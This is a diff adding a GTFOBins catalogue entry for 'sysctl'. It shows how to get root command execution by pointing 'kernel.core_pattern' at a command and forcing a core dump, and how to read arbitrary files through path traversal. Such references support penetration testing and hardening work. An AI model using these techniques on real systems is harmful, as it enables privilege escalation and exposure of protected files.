@@ -1,0 +1,30 @@
+<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/sysctl -->
+---
+functions:
+  command:
+  - blind: true
+    code: |-
+      sysctl 'kernel.core_pattern=|/path/to/command'
+    comment: |-
+      The command is executed by `root` in the background when a core dump occurs.
+
+      To trigger a core dump, send the `SIGQUIT` signal to a process, for example:
+
+      ```
+      sleep infinity &
+      kill -QUIT $!
+      ```
+    contexts:
+      sudo:
+      suid:
+  file-read:
+  - binary: false
+    code: |-
+      sysctl -n "/../../path/to/input-file"
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+    version: |-
+      < 4
+...
